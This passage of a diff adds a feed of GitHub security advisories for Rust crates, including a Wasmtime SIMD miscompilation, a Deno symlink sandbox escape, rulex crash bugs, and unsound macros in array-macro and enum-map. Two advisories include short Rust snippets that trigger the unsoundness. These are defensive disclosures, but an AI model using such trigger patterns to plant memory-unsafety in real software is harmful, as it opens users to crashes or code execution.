+<p>The <code>swizzle</code> instruction lowering in Cranelift erroneously overwrote the mask input register which could corrupt a constant value, for example. This means that future uses of the same constant may see a different value than the constant itself.</p>
+<p>The <code>select</code> instruction lowering in Cranelift wasn't correctly implemented for vector types that are 128-bits wide. When the condition was 0 the wrong instruction was used to move the correct input to the output of the instruction meaning that only the low 32 bits were moved and the upper 96 bits of the result were left as whatever the register previously contained (instead of the input being moved from). The <code>select</code> instruction worked correctly if the condition was nonzero, however.</p>
+<p>This bug in Wasmtime's implementation of these instructions on x86_64 represents an incorrect implementation of the specified semantics of these instructions according to the <a href="https://webassembly.github.io/spec/">WebAssembly specification</a>. The impact of this is benign for hosts running WebAssembly but represents possible vulnerabilities within the execution of a guest program. For example a WebAssembly program could take unintended branches or materialize incorrect values internally which runs the risk of exposing the program itself to other related vulnerabilities which can occur from miscompilations.</p>
+<h3 id="patches">Patches</h3>
+<p>We have released Wasmtime 0.38.1 and cranelift-codegen (and other associated cranelift crates) 0.85.1 which contain the corrected implementations of these two instructions in Cranelift.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not an option for you at this time, you can avoid the vulnerability by <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">disabling the Wasm simd proposal</a></p>
+<pre><code class="language-rust">config.wasm_simd(false);
+</code></pre>
+<p>Additionally the bug is only present on x86_64 hosts. Other aarch64 hosts are not affected. Note that s390x hosts don't yet implement the simd proposal and are not affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/webassembly/simd">The WebAssembly simd proposal</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/issues/4315">Original test case showing the erroneous behavior</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">Fix for the <code>swizzle</code> instruction</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">Fix for the <code>select</code> instruction</a></li>
+</ul>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
+<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31104">https://nvd.nist.gov/vuln/detail/CVE-2022-31104</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">https://github.com/bytecodealliance/wasmtime/pull/4317</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">https://github.com/bytecodealliance/wasmtime/pull/4318</a></li>
+<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd</a></li>
+<li><a href="https://github.com/webassembly/simd">https://github.com/webassembly/simd</a></li>
+<li><a href="https://webassembly.github.io/spec/">https://webassembly.github.io/spec/</a></li>
+<li><a href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/advisories/GHSA-jqwc-c49r-4w2x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-29T22:08:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wasmtime] Miscompilation of `i8x16.swizzle` and `select` with v128 inputs]]></title>
+        <id>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</id>
+        <link href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x"/>
+        <updated>2022-06-29T22:08:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Wasmtime's implementation of the <a href="https://github.com/webassembly/simd">SIMD proposal for WebAssembly</a> on x86_64 contained two distinct bugs in the instruction lowerings implemented in Cranelift. The aarch64 implementation of the simd proposal is not affected. The bugs were presented in the <code>i8x16.swizzle</code> and <code>select</code> WebAssembly instructions. The <code>select</code> instruction is only affected when the inputs are of <code>v128</code> type. The correspondingly affected Cranelift instructions were <code>swizzle</code> and <code>select</code>.</p>
+<p>The <code>swizzle</code> instruction lowering in Cranelift erroneously overwrote the mask input register which could corrupt a constant value, for example. This means that future uses of the same constant may see a different value than the constant itself.</p>
+<p>The <code>select</code> instruction lowering in Cranelift wasn't correctly implemented for vector types that are 128-bits wide. When the condition was 0 the wrong instruction was used to move the correct input to the output of the instruction meaning that only the low 32 bits were moved and the upper 96 bits of the result were left as whatever the register previously contained (instead of the input being moved from). The <code>select</code> instruction worked correctly if the condition was nonzero, however.</p>
+<p>This bug in Wasmtime's implementation of these instructions on x86_64 represents an incorrect implementation of the specified semantics of these instructions according to the <a href="https://webassembly.github.io/spec/">WebAssembly specification</a>. The impact of this is benign for hosts running WebAssembly but represents possible vulnerabilities within the execution of a guest program. For example a WebAssembly program could take unintended branches or materialize incorrect values internally which runs the risk of exposing the program itself to other related vulnerabilities which can occur from miscompilations.</p>
+<h3 id="patches">Patches</h3>
+<p>We have released Wasmtime 0.38.1 and cranelift-codegen (and other associated cranelift crates) 0.85.1 which contain the corrected implementations of these two instructions in Cranelift.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not an option for you at this time, you can avoid the vulnerability by <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">disabling the Wasm simd proposal</a></p>
+<pre><code class="language-rust">config.wasm_simd(false);
+</code></pre>
+<p>Additionally the bug is only present on x86_64 hosts. Other aarch64 hosts are not affected. Note that s390x hosts don't yet implement the simd proposal and are not affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/webassembly/simd">The WebAssembly simd proposal</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/issues/4315">Original test case showing the erroneous behavior</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">Fix for the <code>swizzle</code> instruction</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">Fix for the <code>select</code> instruction</a></li>
+</ul>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
+<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31104">https://nvd.nist.gov/vuln/detail/CVE-2022-31104</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">https://github.com/bytecodealliance/wasmtime/pull/4317</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">https://github.com/bytecodealliance/wasmtime/pull/4318</a></li>
+<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd</a></li>
+<li><a href="https://github.com/webassembly/simd">https://github.com/webassembly/simd</a></li>
+<li><a href="https://webassembly.github.io/spec/">https://webassembly.github.io/spec/</a></li>
+<li><a href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/advisories/GHSA-jqwc-c49r-4w2x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-29T22:08:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[simple_asn1] Panic on incorrect date input to `simple_asn1`]]></title>
+        <id>https://github.com/advisories/GHSA-3m6f-3gfg-4x56</id>
+        <link href="https://github.com/advisories/GHSA-3m6f-3gfg-4x56"/>
+        <updated>2022-06-27T21:07:39.000Z</updated>
+        <content type="html"><![CDATA[<p>Version 0.6.0 of the <code>simple_asn1</code> crate panics on certain malformed
+inputs to its parsing functions, including <code>from_der</code> and <code>der_decode</code>.
+Because this crate is frequently used with inputs from the network, this
+should be considered a security vulnerability.</p>
+<p>The issue occurs when parsing the old ASN.1 "UTCTime" time format.  If an
+attacker provides a UTCTime where the first character is ASCII but the
+second character is above 0x7f, a string slice operation in the
+<code>from_der_</code> function will try to slice into the middle of a UTF-8
+character, and cause a panic.</p>
+<p>This error was introduced in commit
+<a href="https://github.com/acw/simple_asn1/commit/d7d39d709577710e9dc8833ee57d200eef366db8"><code>d7d39d709577710e9dc8</code></a>,
+which updated <code>simple_asn1</code> to use <code>time</code> instead of <code>chrono</code> because of
+<a href="https://rustsec.org/advisories/RUSTSEC-2020-0159"><code>RUSTSEC-2020-159</code></a>.
+Versions of <code>simple_asn1</code> before 0.6.0 are not affected by this issue.</p>
+<p>The <a href="https://github.com/acw/simple_asn1/pull/28">patch</a> was applied in
+<code>simple_asn1</code> version 0.6.1.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/acw/simple_asn1/issues/27">https://github.com/acw/simple_asn1/issues/27</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2021-0125.html">https://rustsec.org/advisories/RUSTSEC-2021-0125.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-3m6f-3gfg-4x56">https://github.com/advisories/GHSA-3m6f-3gfg-4x56</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3m6f-3gfg-4x56</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-17T00:19:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deno] Link Following in Deno]]></title>
+        <id>https://github.com/advisories/GHSA-67hm-27mx-9cg7</id>
+        <link href="https://github.com/advisories/GHSA-67hm-27mx-9cg7"/>
+        <updated>2022-06-23T06:44:35.000Z</updated>
+        <content type="html"><![CDATA[<p>Deno &lt;=1.14.0 file sandbox does not handle symbolic links correctly. When running Deno with specific write access, the Deno.symlink method can be used to gain access to any directory.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41641">https://nvd.nist.gov/vuln/detail/CVE-2021-41641</a></li>
+<li><a href="https://github.com/denoland/deno/issues/12152">https://github.com/denoland/deno/issues/12152</a></li>
+<li><a href="https://hackers.report/report/614876917a7b150012836bb8">https://hackers.report/report/614876917a7b150012836bb8</a></li>
+<li><a href="https://github.com/denoland/deno/pull/12554">https://github.com/denoland/deno/pull/12554</a></li>
+<li><a href="https://github.com/denoland/deno/commit/d44011a69e0674acfa9c59bd7ad7f0523eb61d42">https://github.com/denoland/deno/commit/d44011a69e0674acfa9c59bd7ad7f0523eb61d42</a></li>
+<li><a href="https://github.com/advisories/GHSA-67hm-27mx-9cg7">https://github.com/advisories/GHSA-67hm-27mx-9cg7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-67hm-27mx-9cg7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-06-13T00:00:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[dashmap] Unsoundness in `dashmap` references]]></title>
+        <id>https://github.com/advisories/GHSA-mpg5-fvwp-42m2</id>
+        <link href="https://github.com/advisories/GHSA-mpg5-fvwp-42m2"/>
+        <updated>2022-06-22T19:44:17.000Z</updated>
+        <content type="html"><![CDATA[<p>Reference returned by some methods of <code>Ref</code> (and similar types) may outlive the <code>Ref</code> and escape the lock.
+This causes undefined behavior and may result in a segfault.</p>
+<p>More information in <a href="https://github.com/xacrimon/dashmap/issues/167"><code>dashmap#167</code></a> issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/xacrimon/dashmap/issues/167">https://github.com/xacrimon/dashmap/issues/167</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0002.html">https://rustsec.org/advisories/RUSTSEC-2022-0002.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-mpg5-fvwp-42m2">https://github.com/advisories/GHSA-mpg5-fvwp-42m2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mpg5-fvwp-42m2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-06-16T23:52:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rulex] Uncontrolled Recursion in rulex]]></title>
+        <id>https://github.com/advisories/GHSA-v78m-2q7v-fjqp</id>
+        <link href="https://github.com/advisories/GHSA-v78m-2q7v-fjqp"/>
+        <updated>2022-07-12T21:59:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When parsing untrusted rulex expressions, the stack may overflow, possibly enabling a Denial of Service attack. This happens when parsing an expression with several hundred levels of nesting, causing the process to abort immediately.</p>
+<p>This is a security concern for you, if</p>
+<ul>
+<li>your service parses untrusted rulex expressions (expressions provided by an untrusted user), and</li>
+<li>your service becomes unavailable when the process running rulex aborts due to a stack overflow.</li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>The crash is fixed in version <strong>0.4.3</strong>. Affected users are advised to update to this version.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>None.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Open an issue in <a href="https://github.com/rulex-rs/rulex/issues">rulex</a></li>
+<li>Email me at <a href="mailto:ludwig.stecher@gmx.de">ludwig.stecher@gmx.de</a></li>
+</ul>
+<h3 id="credits">Credits</h3>
+<p>Credit for finding these bugs goes to</p>
+<ul>
+<li><a href="https://github.com/evanrichter">evanrichter</a></li>
+<li><a href="https://forallsecure.com/">ForAllSecure Mayhem</a></li>
+<li><a href="https://github.com/rust-fuzz/cargo-fuzz">cargo fuzz</a> and <a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rulex-rs/rulex/security/advisories/GHSA-v78m-2q7v-fjqp">https://github.com/rulex-rs/rulex/security/advisories/GHSA-v78m-2q7v-fjqp</a></li>
+<li><a href="https://github.com/rulex-rs/rulex/commit/60aa2dc03a22d69c8800fec81f99c96958a11363">https://github.com/rulex-rs/rulex/commit/60aa2dc03a22d69c8800fec81f99c96958a11363</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31099">https://nvd.nist.gov/vuln/detail/CVE-2022-31099</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0030.html">https://rustsec.org/advisories/RUSTSEC-2022-0030.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-v78m-2q7v-fjqp">https://github.com/advisories/GHSA-v78m-2q7v-fjqp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v78m-2q7v-fjqp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-22T17:52:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rulex] Reachable Assertion in rulex]]></title>
+        <id>https://github.com/advisories/GHSA-8v9w-p43c-r885</id>
+        <link href="https://github.com/advisories/GHSA-8v9w-p43c-r885"/>
+        <updated>2022-06-29T21:42:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When parsing untrusted rulex expressions, rulex may crash, possibly enabling a Denial of Service attack. This happens when the expression contains a multi-byte UTF-8 code point in a string literal or after a backslash, because rulex tries to slice into the code point and panics as a result.</p>
+<p>This is a security concern for you, if</p>
+<ul>
+<li>your service parses untrusted rulex expressions (expressions provided by an untrusted user), and</li>
+<li>your service becomes unavailable when the thread running rulex panics.</li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>The crashes are fixed in version <strong>0.4.3</strong>. Affected users are advised to update to this version.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>You can use <code>catch_unwind</code> to recover from panics.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Open an issue in <a href="https://github.com/rulex-rs/rulex/issues">rulex</a></li>
+<li>Email me at <a href="mailto:ludwig.stecher@gmx.de">ludwig.stecher@gmx.de</a></li>
+</ul>
+<h3 id="credits">Credits</h3>
+<p>Credit for finding these bugs goes to</p>
+<ul>
+<li><a href="https://github.com/rust-fuzz/cargo-fuzz">cargo fuzz</a> and <a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a></li>
+<li><a href="https://github.com/evanrichter">evanrichter</a></li>
+<li><a href="https://forallsecure.com/">ForAllSecure Mayhem</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rulex-rs/rulex/security/advisories/GHSA-8v9w-p43c-r885">https://github.com/rulex-rs/rulex/security/advisories/GHSA-8v9w-p43c-r885</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31100">https://nvd.nist.gov/vuln/detail/CVE-2022-31100</a></li>
+<li><a href="https://github.com/rulex-rs/rulex/commit/fac6d58b25c6f9f8c0a6cdc4dec75b37b219f1d6">https://github.com/rulex-rs/rulex/commit/fac6d58b25c6f9f8c0a6cdc4dec75b37b219f1d6</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0031.html">https://rustsec.org/advisories/RUSTSEC-2022-0031.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-8v9w-p43c-r885">https://github.com/advisories/GHSA-8v9w-p43c-r885</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8v9w-p43c-r885</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-21T20:12:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[array-macro] `array!` macro is unsound in presence of traits that implement methods it calls internally]]></title>
+        <id>https://github.com/advisories/GHSA-83gg-pwxf-jr89</id>
+        <link href="https://github.com/advisories/GHSA-83gg-pwxf-jr89"/>
+        <updated>2022-06-20T18:27:08.000Z</updated>
+        <content type="html"><![CDATA[<p>Affected versions of this crate called some methods using auto-ref. The affected code looked like this.</p>
+<pre><code class="language-rust">let mut arr = $crate::__core::mem::MaybeUninit::uninit();
+let mut vec = $crate::__ArrayVec::&lt;T&gt;::new(arr.as_mut_ptr() as *mut T);
+</code></pre>
+<p>In this case, the problem is that <code>as_mut_ptr</code> is a method of <code>&amp;mut MaybeUninit</code>, not <code>MaybeUninit</code>. This made it possible for traits to hijack the method calls in order to cause unsoundness.</p>
+<pre><code class="language-rust">trait AsMutPtr&lt;T&gt; {
+    fn as_mut_ptr(&amp;self) -&gt; *mut T;
+}
+impl&lt;T&gt; AsMutPtr&lt;T&gt; for std::mem::MaybeUninit&lt;T&gt; {
+    fn as_mut_ptr(&amp;self) -&gt; *mut T {
+        std::ptr::null_mut()
+    }
+}
+array![0; 1];
+</code></pre>
+<p>The flaw was corrected by explicitly referencing variables in macro body in order to avoid auto-ref.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rustsec/advisory-db/blob/main/crates/array-macro/RUSTSEC-2020-0161.md">https://github.com/rustsec/advisory-db/blob/main/crates/array-macro/RUSTSEC-2020-0161.md</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0161.html">https://rustsec.org/advisories/RUSTSEC-2020-0161.html</a></li>
+<li><a href="https://github.com/xfix/array-macro/commit/01940637dd8f3bfeeee3faf9639fa9ae52f19f4d">https://github.com/xfix/array-macro/commit/01940637dd8f3bfeeee3faf9639fa9ae52f19f4d</a></li>
+<li><a href="https://github.com/advisories/GHSA-83gg-pwxf-jr89">https://github.com/advisories/GHSA-83gg-pwxf-jr89</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-83gg-pwxf-jr89</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-06-16T23:40:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[enum-map] enum_map macro can cause UB when `Enum` trait is incorrectly implemented]]></title>
+        <id>https://github.com/advisories/GHSA-rxhx-9fj6-6h2m</id>
+        <link href="https://github.com/advisories/GHSA-rxhx-9fj6-6h2m"/>
+        <updated>2022-06-20T18:15:49.000Z</updated>
+        <content type="html"><![CDATA[<p>Affected versions of this crate did not properly check the length of an enum when using <code>enum_map!</code> macro, trusting user-provided length.</p>
+<p>When the <code>LENGTH</code> in the <code>Enum</code> trait does not match the array length in the <code>EnumArray</code> trait, this can result in the initialization of the enum map with uninitialized types, which in turn can allow an attacker to execute arbitrary code.</p>
+<p>This problem can only occur with a manual implementation of the Enum trait, it will never occur for enums that use <code>#[derive(Enum)]</code>.</p>
+<p>Example code that triggers this vulnerability looks like this:</p>
+<pre><code class="language-rust">enum E {
+    A,
+    B,
+    C,
+}
+
+impl Enum for E {
+    const LENGTH: usize = 2;
+
+    fn from_usize(value: usize) -&gt; E {
+        match value {
+            0 =&gt; E::A,
+            1 =&gt; E::B,
+            2 =&gt; E::C,
+            _ =&gt; unimplemented!(),
+        }
+    }
+
+    fn into_usize(self) -&gt; usize {
+        self as usize
+    }
+}
+
+impl&lt;V&gt; EnumArray&lt;V&gt; for E {
+    type Array = [V; 3];
+}
+
+let _map: EnumMap&lt;E, String&gt; = enum_map! { _ =&gt; "Hello, world!".into() };
+</code></pre>
+<p>The flaw was corrected in commit <a href="https://github.com/xfix/enum-map/commit/b824e232f2fb47837740070096ac253df8e80dfc">b824e23</a> by putting <code>LENGTH</code> property on sealed trait for macro to read.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rustsec/advisory-db/blob/main/crates/enum-map/RUSTSEC-2022-0010.md">https://github.com/rustsec/advisory-db/blob/main/crates/enum-map/RUSTSEC-2022-0010.md</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0010.html">https://rustsec.org/advisories/RUSTSEC-2022-0010.html</a></li>
+<li><a href="https://github.com/xfix/enum-map/commit/b824e232f2fb47837740070096ac253df8e80dfc">https://github.com/xfix/enum-map/commit/b824e232f2fb47837740070096ac253df8e80dfc</a></li>
+<li><a href="https://github.com/xfix/enum-map/blob/master/CHANGELOG.md#version-202">https://github.com/xfix/enum-map/blob/master/CHANGELOG.md#version-202</a></li>
+<li><a href="https://github.com/advisories/GHSA-rxhx-9fj6-6h2m">https://github.com/advisories/GHSA-rxhx-9fj6-6h2m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rxhx-9fj6-6h2m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-06-16T23:53:32.000Z</published>
+    </entry>
+</feed>
